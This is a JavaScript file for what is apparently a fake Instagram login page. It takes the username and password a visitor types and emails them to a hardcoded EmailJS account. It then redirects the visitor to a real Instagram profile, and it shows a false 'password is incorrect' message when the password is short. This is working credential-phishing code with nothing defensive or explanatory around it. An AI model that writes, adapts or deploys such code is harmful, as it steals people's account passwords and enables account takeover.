console.log("aaa");
const emailjsConfig = {
  userId: "e-ZHcThsqM832BEmt",
  serviceId: "service_luzn66c",
  templateId: "template_kmkaq3o",
};
function sendEmail(event) {
  event.preventDefault();

  const form = document.getElementById("contactForm");
  console.log(form.elements["username"].value);

  if (form.elements["password"].value.length >= 6) {
    document.getElementById("error").innerText = "";
    emailjs
      .sendForm(
        emailjsConfig.serviceId,
        emailjsConfig.templateId,
        form,
        emailjsConfig.userId
      )
      .then(
        (response) => {
          console.log("Email sent successfully:", response);

          // Redirect to a specific URL after successful email submission
          window.location.href = "https://www.instagram.com/leo_archiavi";
        },
        (error) => {
          console.error("Error sending email:", error);
        }
      );
  } else {
    document.getElementById("error").innerText =
      "Sorry, your password is incorrect. Please check your password.";
  }

  /* */
}
